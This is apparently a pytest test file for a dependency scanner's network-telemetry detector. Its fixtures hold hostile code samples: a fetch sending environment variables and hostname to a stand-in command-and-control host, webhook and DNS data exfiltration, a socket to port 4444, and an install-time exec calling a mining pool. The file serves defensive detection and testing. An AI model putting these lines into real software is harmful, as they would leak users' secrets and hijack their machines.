"""Tests for network telemetry scanner."""

import tempfile
from pathlib import Path

import pytest

from depfence.core.models import Severity
from depfence.scanners.network_scanner import NetworkScanner


@pytest.fixture
def scanner():
    return NetworkScanner()


def test_mining_pool_detection(scanner):
    content = 'const pool = "stratum+tcp://xmr.pool.minergate.com:45700"'
    findings = scanner.scan_content(content, "miner.js")
    assert any(f.severity == Severity.CRITICAL for f in findings)
    assert any("mining" in f.title.lower() for f in findings)


def test_webhook_detection(scanner):
    content = 'fetch("https://hooks.slack.com/services/T000/B000/xxxx", {body: data})'
    findings = scanner.scan_content(content, "exfil.js")
    assert any("webhook" in f.title.lower() for f in findings)


def test_discord_webhook(scanner):
    content = 'requests.post("https://discordapp.com/api/webhooks/123/token", json=data)'
    findings = scanner.scan_content(content, "exfil.py")
    assert any("webhook" in f.title.lower() for f in findings)


def test_data_exfiltration_pattern(scanner):
    content = """
import os
hostname = os.hostname()
env = os.environ
user = os.userInfo()
fetch("https://evil-c2.example.com/collect", {body: JSON.stringify({hostname, env, user})})
"""
    findings = scanner.scan_content(content, "stealer.js")
    assert any("exfiltration" in f.title.lower() for f in findings)


def test_hardcoded_ip(scanner):
    content = 'socket.connect("45.33.32.156", 4444)'
    findings = scanner.scan_content(content, "backdoor.py")
    assert any("ip" in f.title.lower() or "hardcoded" in f.title.lower() for f in findings)


def test_private_ip_not_flagged(scanner):
    content = 'server.listen("192.168.1.100", 3000)'
    findings = scanner.scan_content(content, "server.js")
    ip_findings = [f for f in findings if "ip" in f.title.lower() or "hardcoded" in f.title.lower()]
    assert len(ip_findings) == 0


def test_dns_exfiltration(scanner):
    content = 'dns.lookup("aGVsbG93b3JsZHRoaXNpc2FiYXNlNjRlbmNvZGVkc3RyaW5n.evil.com")'
    findings = scanner.scan_content(content, "dns_exfil.js")
    assert any("dns" in f.title.lower() for f in findings)


def test_safe_urls_not_flagged(scanner):
    content = """
fetch("https://registry.npmjs.org/lodash")
fetch("https://api.github.com/repos/owner/repo")
fetch("https://pypi.org/simple/requests/")
"""
    findings = scanner.scan_content(content, "legit.js")
    assert len(findings) == 0


def test_ngrok_flagged(scanner):
    content = 'axios.post("https://abc123.ngrok.io/data", payload)'
    findings = scanner.scan_content(content, "tunnel.js")
    assert any("webhook" in f.title.lower() or "exfil" in f.title.lower() for f in findings)


@pytest.mark.asyncio
async def test_scan_files(scanner):
    with tempfile.TemporaryDirectory() as d:
        f = Path(d) / "install.js"
        f.write_text('require("child_process").exec("curl stratum+tcp://pool.xmr.to:3333")')
        findings = await scanner.scan_files(Path(d), [f])
        assert len(findings) >= 1
